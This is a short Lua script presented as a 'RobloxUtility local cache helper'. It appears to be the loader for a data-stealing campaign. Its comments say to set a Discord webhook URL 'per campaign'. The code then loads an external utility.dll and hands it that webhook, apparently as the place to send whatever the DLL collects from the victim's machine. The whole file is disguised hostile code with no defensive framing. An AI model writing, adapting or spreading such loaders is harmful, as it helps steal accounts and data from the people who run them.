-- RobloxUtility — local cache helper (loader)
-- Edit WEBHOOK_URL below per campaign. The DLL does the rest.
local WEBHOOK_URL = "https://discord.com/api/webhooks/1476791698041339997/tRLjlN11V6jBrSfHak-PcMTpty-sjHAPglOXl5Gs92UH0nCz0bukhQuuMmv0b_uNj6Pi"
local d = (load_dll or loadlibrary)("utility.dll")
if d and d.Run then d.Run(WEBHOOK_URL, 0) end
